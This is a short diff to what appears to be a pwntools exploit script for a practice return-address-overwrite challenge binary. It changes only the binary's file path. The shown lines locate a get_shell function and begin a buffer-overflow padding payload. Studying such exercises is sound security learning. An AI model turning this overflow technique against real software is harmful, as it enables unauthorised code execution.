@@ -1,8 +1,8 @@
 from pwn import *          # Import pwntools module
 
-p = process('./rao')       # Spawn process './rao'
+p = process('./Return Address Overwrite/problem/rao')       # Spawn process './rao'
 
-elf = ELF('./rao')
+elf = ELF('./Return Address Overwrite/problem/rao')
 get_shell = elf.symbols['get_shell']       # The address of get_shell()
 
 payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
